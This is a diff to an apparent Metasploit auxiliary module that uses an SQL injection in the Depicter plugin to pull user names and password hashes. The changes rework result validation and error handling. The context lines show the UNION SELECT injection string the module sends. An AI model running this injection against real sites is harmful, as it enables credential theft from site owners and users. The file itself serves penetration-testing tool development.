@@ -58,33 +58,10 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  class DepicterSQLi < Msf::Exploit::SQLi::MySQLi::Common
-    def dump_table_fields(table, columns, condition = '', num_limit = 0)
-      rows = super
-      unless rows.is_a?(Array) && rows.all? { |row| row.is_a?(Array) && row.length == columns.length && row.all? { |field| field.is_a?(String) } }
-        raise RequestError.new(Msf::Module::Failure::UnexpectedReply, 'Depicter returned an incomplete user row')
-      end
-
-      rows
-    end
-  end
-
   def get_sqli_object
     # Per-row extraction avoids group_concat limits; HEX keeps field delimiters
     # in stored usernames and hashes separate from the helper's row format.
-    hex_encoder = DepicterSQLi::ENCODERS.fetch(:hex)
-    encoder = hex_encoder.merge(
-      decode: lambda do |data|
-        # Rex's general hex decoder accepts odd/nonhex input. MySQL HEX fields
-        # must contain complete byte pairs before they reach credential storage.
-        unless data.is_a?(String) && data.match?(/\A(?:[0-9a-f]{2})*\z/i)
-          raise RequestError.new(Failure::UnexpectedReply, 'Depicter returned a malformed HEX field')
-        end
-
-        hex_encoder.fetch(:decode).call(data)
-      end
-    )
-    create_sqli(dbms: DepicterSQLi, opts: { hex_encode_strings: true, encoder: encoder, safe: true }) do |payload|
+    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true, strict_results: true }) do |payload|
       expr = payload.to_s.strip.gsub(/\s+/, ' ')
       r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
       injected = "#{r1}') UNION SELECT #{r2},#{r3},(#{expr}),#{r4},#{r5}-- -"
@@ -138,10 +115,6 @@ class MetasploitModule < Msf::Auxiliary
         raise RequestError.new(Failure::UnexpectedReply, 'Depicter SQL response included an invalid scalar ID')
       end
 
-      if @query_operation == :dump && expr.match?(/\Aselect count\(1\) from /i) && !value.to_s.match?(/\A\d+\z/)
-        raise RequestError.new(Failure::UnexpectedReply, 'Depicter returned an invalid user row count')
-      end
-
       value.to_s
     end
   end
@@ -153,6 +126,9 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Safe('SQL injection test did not succeed')
   rescue RequestError => e
     Exploit::CheckCode::Unknown(e.message)
+  rescue MySQLi::Common::ResultError => e
+    elog('Depicter SQL result validation failed', error: e)
+    Exploit::CheckCode::Unknown("Depicter SQL response was invalid: #{e.message}")
   rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
     elog('Depicter SQL injection check failed to connect', error: e)
     Exploit::CheckCode::Unknown('Depicter SQL request failed to connect or complete')
@@ -188,6 +164,9 @@ class MetasploitModule < Msf::Auxiliary
     else
       fail_with(Failure::UnexpectedReply, e.message)
     end
+  rescue MySQLi::Common::ResultError => e
+    elog('Depicter user extraction validation failed', error: e)
+    fail_with(Failure::UnexpectedReply, "Depicter user extraction failed: #{e.message}")
   rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
     elog('Depicter credential collection failed to connect', error: e)
     fail_with(Failure::Unreachable, 'Depicter SQL request failed to connect or complete')
